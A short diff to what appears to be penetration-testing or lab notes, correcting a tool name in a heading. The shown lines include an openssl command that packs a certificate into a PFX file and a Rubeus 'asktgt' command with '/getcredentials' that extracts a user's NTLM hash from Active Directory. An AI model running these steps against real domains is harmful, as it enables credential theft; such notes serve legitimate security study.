@@ -19,7 +19,7 @@ nano user_name.pem
 
 openssl pkcs12 -in user_name.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
 ```
-# 3. Transfer the cert.pfx and Rebues in Box
+# 3. Transfer the cert.pfx and Rebeus in Box
 # 4. Extract the NTLM hash
 ```language
 .\rubeus.exe asktgt /user:<current_user_name> /certificate:C:\xampp\htdocs\files\cert.pfx /getcredentials /show /nowrap
